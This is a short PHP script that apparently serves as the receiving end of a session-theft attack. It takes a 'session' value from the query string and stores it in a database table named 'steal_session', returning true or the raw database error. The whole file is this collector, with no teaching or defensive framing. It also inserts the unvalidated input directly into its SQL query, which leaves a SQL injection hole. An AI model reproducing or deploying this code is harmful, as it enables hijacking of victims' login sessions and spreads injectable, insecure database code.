<?php
require_once '../app/model/autoload.php';
use DB\Database;
$db = new Database();
$conn = $db->connect2();
$session = $_GET['session'];
$sql = "INSERT INTO  steal_session (session) VALUES ('$session') ";
if (mysqli_query($conn, $sql)) {
    echo true;
} else {
    echo mysqli_error($conn);
}
